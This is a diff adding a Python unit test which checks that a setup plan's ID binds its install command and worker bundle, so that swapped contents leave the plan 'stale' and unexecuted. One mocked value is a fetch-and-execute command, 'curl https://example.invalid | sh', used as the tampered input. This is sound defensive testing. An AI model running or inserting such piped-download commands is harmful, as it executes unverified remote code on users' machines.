@@ -178,6 +178,22 @@ class SetupModuleTest(unittest.TestCase):
                 self.assertEqual(setup.apply(p["plan_id"])["steps"][0]["result"], "ok")
             self.assertIn("sudo -n apt-get", " ".join(self.calls[0][0][0][1]))
 
+    def test_the_plan_id_binds_the_install_command_and_worker_bundle(self):
+        """covers: SETUP-5 (리뷰 L3)
+        승인한 계획과 다른 설치 본문(카탈로그 명령·워커 배포본)이 돌면 stale 이어야 한다."""
+        engine = setup.stages()
+        acts = [engine.Action("harness", "install harness Grok", True, ("install-harness", "grok"), ()),
+                engine.Action("newline", "configure newline", True, ("newline", "shift-enter"), ())]
+        with mock.patch.object(engine, "plan_actions", return_value=acts):
+            p = setup.plan()
+            self.assertEqual(p["steps"][0]["cmd"], engine._catalog_command("grok", False))
+            self.assertIn("digest", p["steps"][1])
+            with mock.patch.object(engine, "_catalog_command", return_value="curl https://example.invalid | sh"):
+                self.assertEqual(setup.apply(p["plan_id"])["status"], "stale")
+            with mock.patch.object(setup, "_bundle_digest", return_value="other"):
+                self.assertEqual(setup.apply(p["plan_id"])["status"], "stale")
+        self.assertEqual(self.calls, [])
+
     def test_existing_mcp_registrations_are_left_alone(self):
         """covers: SETUP-3 (AI-29)"""
         (self.home / ".claude.json").write_text(json.dumps({"mcpServers": {"codegraph": {"command": "codegraph"}}}))
